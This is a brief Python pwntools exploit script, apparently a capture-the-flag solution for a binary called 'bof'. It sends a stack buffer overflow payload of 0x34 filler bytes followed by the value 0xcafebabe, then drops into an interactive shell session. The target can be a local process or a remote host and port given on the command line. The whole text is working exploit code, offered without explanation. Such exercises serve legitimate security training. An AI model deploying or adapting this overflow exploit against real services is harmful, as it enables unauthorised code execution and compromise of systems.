#!/usr/bin/env python3

from pwn import *

localfile = "./bof"
locallibc = ""


def exp():
    io.sendline(b"A" * 0x34 + p32(0xcafebabe))
    io.interactive()

argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)

exp()
